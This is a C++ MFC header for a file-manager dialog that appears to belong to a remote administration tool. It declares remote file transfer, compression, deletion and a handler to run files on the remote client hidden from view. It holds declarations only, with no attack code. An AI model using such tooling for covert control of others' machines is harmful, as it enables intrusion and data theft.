#pragma once
#include "IOCPServer.h"
#include"TrueColorToolBar.h"
#include "afxwin.h"
#include "afxcmn.h"
#include "Resource.h"
// CFileManagerDlg 对话框

static UINT Indicators1[] =
{

	ID_SEPARATOR,
	ID_SEPARATOR,
	IDR_STATUSBAR_PROCESS,
};
#define MAX_SEND_BUFFER  8192
typedef struct
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILE_SIZE;
#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))
typedef CList<CString, CString> ListTemplate;
class CFileManagerDlg : public CDialog
{
	DECLARE_DYNAMIC(CFileManagerDlg)

public:
	CFileManagerDlg(CWnd* pParent = NULL, IOCPServer* IOCPServer = NULL, CONTEXT_OBJECT *ContextObject = NULL);   // 标准构造函数
	virtual ~CFileManagerDlg();
	VOID FixedServerDiskDriverList();
	VOID FixedClientDiskDriverList();
	int GetServerIconIndex(LPCTSTR szVolume, DWORD dwFileAttributes);
	VOID FixedServerFileList(CString strDirectory = "");
	VOID GetClientFileList(CString strDirectory = "");
	CString GetParentDirectory(CString strPath);
	BOOL MakeSureDirectoryPathExists(char* szDirtoryFullPath);
	VOID EnableControl(BOOL bEnable);
	BOOL DeleteDirectory(LPCTSTR strDirectoryFullPath);
	VOID OnReceiveComplete();
	VOID FixedClientFileList(BYTE* szBuffer, ULONG ulLength);
	VOID DropItemOnList();
	VOID OnCopyServerToClient();
	BOOL FixedServerToClientDirectory(LPCTSTR szDirectoryFullPath);
	BOOL SendToClientJop();
	VOID SendTransferMode();
	VOID EndCopyServerToClient();
	VOID ShowProgress();
	VOID SendFileData();
	VOID ServerCompress(ULONG ulType);
	BOOL CompressFiles(PCSTR strRarFileFullPath, PSTR strSourceFileFullPath,ULONG ulType);
public:
	CONTEXT_OBJECT* m_ContextObject;
	IOCPServer* m_IocpServer;
	CString m_strClientIp;
	BYTE   m_szClientDiskDriverList[0x1000] = { 0 };
	char   m_szServerDiskDriverList[0x1000] = { 0 };
	__int64 m_OperatingFileLength;
	__int64 m_ulCounter;
	CImageList* m_ImageList_Large;
	CImageList* m_ImageList_Small;

	BOOL m_bDragging;
	BOOL  m_bIsStop;
	//真彩工具条
	CTrueColorToolBar m_ToolBar_File_Server;



	CString m_Server_File_Path;
	CString m_Client_File_Path;
	CString m_strSourFileFullPath;
	CString m_strDestFileFullPath;


	CStatic m_FileServerBarPos;
	CStatic m_FileClientBarPos;
	CListCtrl m_ControlList_Server;
	CListCtrl m_ControlList_Client;
	CComboBox m_ComboBox_Server;
	CComboBox m_ComboBox_Client;

	CStatusBar     m_StatusBar; // 带进度条的状态栏
	CProgressCtrl* m_ProgressCtrl;


	HCURSOR m_hCursor;

	CListCtrl* m_DragControlList;
	CListCtrl* m_DropControlList;

	ListTemplate m_Remote_Upload_Jop;
	ULONG  m_ulTransferMode;
// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_DIALOG_FILE_MANAGER };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
public:
	virtual BOOL OnInitDialog();
	
	
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	afx_msg void OnNMDblclkListServer(NMHDR *pNMHDR, LRESULT *pResult);
	
	afx_msg void OnSelchangeComboServer();
	afx_msg void OnIdtServerFilePrev();
	afx_msg void OnIdtServerFileNewFolder();
	afx_msg void OnIdtServerFileDelete();
	afx_msg void OnIdtServerFileStop();
	afx_msg void OnViewBigIcon();
	afx_msg void OnViewSmallIcon();
	afx_msg void OnViewDetail();
	afx_msg void OnViewList();
	afx_msg void OnNMDblclkListClient(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnLvnBegindragListServer(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnMouseMove(UINT nFlags, CPoint point);
	afx_msg void OnLButtonUp(UINT nFlags, CPoint point);
	afx_msg void OnNMRClickListServer(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnOperationServerRun();
	afx_msg void OnOperationRename();
	afx_msg void OnOperationClientShowRun();
	afx_msg void OnOperationClientHideRun();
	afx_msg void OnOperationCompress();
	afx_msg void OnOperationDecompress();
	afx_msg void OnNMRClickListClient(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnLvnEndlabeleditListServer(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnLvnEndlabeleditListClient(NMHDR *pNMHDR, LRESULT *pResult);
};
